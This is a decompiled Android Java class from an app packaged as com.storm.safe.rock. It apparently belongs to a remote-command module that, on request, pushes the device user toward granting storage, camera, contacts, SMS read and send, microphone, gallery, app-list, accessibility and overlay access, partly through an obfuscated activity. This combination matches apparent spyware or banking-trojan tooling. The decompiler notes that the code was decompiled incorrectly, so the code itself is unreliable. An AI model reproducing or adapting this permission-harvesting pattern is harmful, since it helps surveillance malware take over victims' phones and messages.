package com.storm.safe.rock.service.modules.command;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import com.storm.safe.rock.p029ui.umrkmgrri;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.AppCommandHandler$handleRequestPermission$2", m214403f = "AppCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class AppCommandHandler$handleRequestPermission$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ String f53436a1;

    /* renamed from: a2 */
    public final /* synthetic */ uz0 f53437a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AppCommandHandler$handleRequestPermission$2(String str, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53436a1 = str;
        this.f53437a2 = uz0Var;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new AppCommandHandler$handleRequestPermission$2(this.f53436a1, this.f53437a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((AppCommandHandler$handleRequestPermission$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:53:0x017e A[Catch: Exception -> 0x0033, TryCatch #1 {Exception -> 0x0033, blocks: (B:3:0x0017, B:7:0x0029, B:19:0x005f, B:58:0x01c8, B:12:0x0036, B:15:0x003e, B:16:0x0055, B:20:0x0078, B:23:0x0082, B:24:0x009e, B:27:0x00a8, B:28:0x00c1, B:31:0x00cb, B:32:0x00de, B:35:0x00e6, B:36:0x00fd, B:39:0x0105, B:40:0x011c, B:46:0x0150, B:47:0x0159, B:50:0x0160, B:51:0x0176, B:54:0x0196, B:56:0x019c, B:57:0x01c5, B:53:0x017e, B:43:0x0125), top: B:64:0x0017, inners: #0 }] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        String str = this.f53436a1;
        uz0 uz0Var = this.f53437a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            switch (str.hashCode()) {
                case -1884274053:
                    if (!str.equals("storage")) {
                        t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                        uz0Var.m214875b1();
                    } else if (Build.VERSION.SDK_INT >= 30) {
                        Intent intent = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                        intent.setData(Uri.parse("package:" + uz0Var.f60536a0.getPackageName()));
                        intent.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent);
                    } else {
                        uz0Var.m214875b1();
                    }
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case -1367751899:
                    if (str.equals("camera")) {
                        Intent intent2 = new Intent(uz0Var.f60536a0, (Class<?>) umrkmgrri.class);
                        intent2.putExtra("permission_type", "camera");
                        intent2.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent2);
                        uz0Var.m214886c2(5);
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                    uz0Var.m214875b1();
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case -1091287984:
                    if (str.equals("overlay")) {
                        try {
                            Intent intent3 = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                            intent3.setData(Uri.parse("package:" + uz0Var.f60536a0.getPackageName()));
                            intent3.addFlags(268435456);
                            uz0Var.f60536a0.startActivity(intent3);
                        } catch (Exception e) {
                            t60.m214705c6("AppCmdHandler", "打开悬浮窗权限页面失败", e);
                            uz0Var.m214875b1();
                        }
                    }
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case -794188193:
                    if (str.equals("appList")) {
                        Intent intent4 = new Intent(uz0Var.f60536a0, (Class<?>) umrkmgrri.class);
                        intent4.putExtra("permission_type", "appList");
                        intent4.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent4);
                        uz0Var.m214886c2(5);
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                    uz0Var.m214875b1();
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case -567451565:
                    if (str.equals("contacts")) {
                        Intent intent5 = new Intent(uz0Var.f60536a0, (Class<?>) umrkmgrri.class);
                        intent5.putExtra("permission_type", "contacts");
                        intent5.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent5);
                        uz0Var.m214886c2(5);
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                    uz0Var.m214875b1();
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case -213139122:
                    if (str.equals("accessibility")) {
                        Intent intent6 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                        intent6.addFlags(1350631424);
                        uz0Var.f60536a0.startActivity(intent6);
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                    uz0Var.m214875b1();
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case 106642994:
                    if (str.equals("photo")) {
                        Intent intent7 = new Intent(uz0Var.f60536a0, (Class<?>) umrkmgrri.class);
                        intent7.putExtra("permission_type", "gallery");
                        intent7.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent7);
                        uz0Var.m214886c2(5);
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                    uz0Var.m214875b1();
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case 595233003:
                    if (str.equals("notification")) {
                        Intent intent8 = new Intent("android.settings.APP_NOTIFICATION_SETTINGS");
                        intent8.putExtra("android.provider.extra.APP_PACKAGE", uz0Var.f60536a0.getPackageName());
                        intent8.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent8);
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                    uz0Var.m214875b1();
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case 1080392675:
                    if (!str.equals("readSms")) {
                        t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                        uz0Var.m214875b1();
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    Intent intent9 = new Intent(uz0Var.f60536a0, (Class<?>) umrkmgrri.class);
                    intent9.putExtra("permission_type", "sms");
                    intent9.addFlags(268435456);
                    uz0Var.f60536a0.startActivity(intent9);
                    uz0Var.m214886c2(5);
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case 1370921258:
                    if (str.equals("microphone")) {
                        Intent intent10 = new Intent(uz0Var.f60536a0, (Class<?>) umrkmgrri.class);
                        intent10.putExtra("permission_type", "microphone");
                        intent10.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent10);
                        uz0Var.m214886c2(5);
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                    uz0Var.m214875b1();
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
                case 1979902129:
                    if (!str.equals("sendSms")) {
                        t60.m214726f4("AppCmdHandler", "未知的权限类型: " + str + "，打开应用设置");
                        uz0Var.m214875b1();
                        t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                        return new Integer(0);
                    }
                    Intent intent92 = new Intent(uz0Var.f60536a0, (Class<?>) umrkmgrri.class);
                    intent92.putExtra("permission_type", "sms");
                    intent92.addFlags(268435456);
                    uz0Var.f60536a0.startActivity(intent92);
                    uz0Var.m214886c2(5);
                    t60.m214714d6("AppCmdHandler", "已请求权限: ".concat(str));
                    return new Integer(0);
            }
        } catch (Exception e2) {
            t60.m214705c6("AppCmdHandler", "请求权限失败: ".concat(str), e2);
            uz0Var.m214875b1();
            return C1351vv.f60710b1;
        }
    }
}
